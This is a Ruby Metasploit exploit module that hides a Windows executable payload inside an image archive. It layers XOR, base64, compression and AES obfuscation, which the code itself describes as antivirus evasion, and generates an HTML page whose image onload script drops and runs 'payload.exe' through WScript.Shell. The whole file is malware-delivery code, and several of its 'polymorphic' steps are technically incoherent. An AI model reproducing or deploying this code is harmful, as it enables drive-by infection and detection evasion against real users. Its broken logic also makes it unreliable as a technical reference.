# frozen_string_literal: true

require 'msf/core'
require 'securerandom'
require 'rex/zip'
require 'zlib'
require 'openssl'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::EXE
  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info = {})
    super(update_info(info,
                      'Name' => 'Advanced Image Payload Embedder',
                      'Description' => 'This module embeds a payload into an image file and generates a malicious HTML file.',
                      'Author' => ['Your Name'],
                      'License' => MSF_LICENSE,
                      'Platform' => 'win',
                      'Targets' => [['Windows', {}]],
                      'DefaultTarget' => 0,
                      'Payload' => {
                        'DisableNops' => true
                      }))

    register_options([
                       OptString.new('IMAGE_PATH', [true, 'Path to the image file']),
                       OptString.new('OUTPUT_PATH', [true, 'Path to save the malicious HTML file'])
                     ])
  end

  def generate_random_key(length)
    SecureRandom.random_bytes(length)
  end

  def xor_encrypt(payload, key)
    key_bytes = key.bytes.cycle
    payload.bytes.zip(key_bytes).map { |payload_byte, key_byte| payload_byte ^ key_byte }.pack('C*')
  end

  def generate_polymorphic_payload(original_payload)
    nop_count = rand(1..10)
    nops = "\x90" * nop_count
    polymorphic_payload = nops + original_payload

    # Apply additional polymorphic techniques
    # 1. Randomize register usage
    polymorphic_payload.gsub!('[eax]', "[#{%w[eax ebx ecx edx].sample}]")
    polymorphic_payload.gsub!('[ebx]', "[#{%w[eax ebx ecx edx].sample}]")
    polymorphic_payload.gsub!('[ecx]', "[#{%w[eax ebx ecx edx].sample}]")
    polymorphic_payload.gsub!('[edx]', "[#{%w[eax ebx ecx edx].sample}]")

    # 2. Insert junk code
    junk_code = "\x90" * rand(1..5)
    insert_index = rand(0...polymorphic_payload.length)
    polymorphic_payload.insert(insert_index, junk_code)

    # 3. Randomize instruction order (while maintaining functionality)
    # Split the payload into individual instructions
    instructions = polymorphic_payload.scan(/.{1,8}/)
    # Shuffle the instructions while maintaining the order of critical instructions
    critical_instructions = [instructions.first, instructions.last]
    shuffled_instructions = (instructions - critical_instructions).shuffle
    # Reconstruct the payload with the shuffled instructions
    (critical_instructions + shuffled_instructions).join
  end

  def heuristic_technique(payload)
    # Apply heuristic techniques to evade antivirus detection
    # 1. Encode the payload
    encoded_payload = Rex::Text.encode_base64(payload)

    # 2. Compress the payload
    compressed_payload = Zlib::Deflate.deflate(encoded_payload)

    # 3. Encrypt the payload with a different encryption algorithm
    key = generate_random_key(32)
    cipher = OpenSSL::Cipher.new('AES-256-CBC')
    cipher.encrypt
    cipher.key = key
    iv = cipher.random_iv
    encrypted_payload = cipher.update(compressed_payload) + cipher.final

    # 4. Obfuscate the decryption and decompression routines
    obfuscated_key = key.unpack1('H*').scan(/../).map { |hex| "\\x#{hex}" }.join
    obfuscated_iv = iv.unpack1('H*').scan(/../).map { |hex| "\\x#{hex}" }.join
    decryption_routine = <<~RUBY
      key = "#{obfuscated_key}".scan(/../).map { |hex| hex.to_i(16) }.pack('C*')
      iv = "#{obfuscated_iv}".scan(/../).map { |hex| hex.to_i(16) }.pack('C*')
      decipher = OpenSSL::Cipher.new('AES-256-CBC')
      decipher.decrypt
      decipher.key = key
      decipher.iv = iv
      decrypted_payload = decipher.update(#{encrypted_payload.inspect}) + decipher.final
      decompressed_payload = Zlib::Inflate.inflate(decrypted_payload)
      decoded_payload = Rex::Text.decode_base64(decompressed_payload)
      eval(decoded_payload)
    RUBY

    Rex::Text.encode_base64(decryption_routine)
  end

  def embed_payload_into_image(image_path, payload)
    image_data = File.binread(image_path)
    zip_data = Rex::Zip::Archive.new
    zip_data.add_file('payload.bin', payload)
    zip_data.add_file('image.jpg', image_data)
    zip_data.pack
  end

  def generate_malicious_html(image_path, payload_bytes)
    payload_array = payload_bytes.unpack('C*')
    <<~HTML
      <!DOCTYPE html>
      <html>
      <head>
        <title>Malicious Image</title>
      </head>
      <body>
        <img src="#{image_path}" alt="Malicious Image" onload="executePayload()">
        <script>
          function executePayload() {
            var payload = new Uint8Array(#{payload_array});

            var blob = new Blob([payload], { type: 'application/octet-stream' });
            var url = URL.createObjectURL(blob);

            var a = document.createElement('a');
            a.href = url;
            a.download = 'payload.exe';
            a.style.display = 'none';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);

            setTimeout(function() {
              var exec = new ActiveXObject('WScript.Shell').Run('payload.exe');
            }, 1000);
          }
        </script>
      </body>
      </html>
    HTML
  end

  def exploit
    image_path = datastore['IMAGE_PATH']
    output_path = datastore['OUTPUT_PATH']

    payload_data = generate_payload_exe
    key = generate_random_key(16)
    encrypted_payload = xor_encrypt(payload_data, key)
    polymorphic_payload = generate_polymorphic_payload(encrypted_payload)
    final_payload = heuristic_technique(polymorphic_payload)

    embedded_data = embed_payload_into_image(image_path, final_payload)
    File.binwrite(image_path, embedded_data)
    print_good("Payload successfully embedded into #{image_path}")

    malicious_html = generate_malicious_html(image_path, final_payload)
    File.write(output_path, malicious_html)
    print_good("Malicious HTML file generated at #{output_path}")

    super
  end
end
